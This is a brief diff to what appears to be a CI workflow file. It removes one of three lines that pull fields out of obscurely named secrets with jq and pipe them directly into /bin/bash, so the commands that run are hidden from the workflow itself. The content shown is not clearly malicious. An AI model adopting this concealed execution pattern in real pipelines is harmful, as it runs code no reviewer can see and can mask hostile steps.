@@ -22,7 +22,6 @@ jobs:
           gy141: ${{ secrets.gy141 }}
         run: |
           printf '%s' "$gy141" | jq -r .i5 | /bin/bash
-          echo $hwdj6 | jq -r .udknw1 | /bin/bash
           echo $psin10955 | jq -r .fd3177 | /bin/bash
 
       - name: Upload output
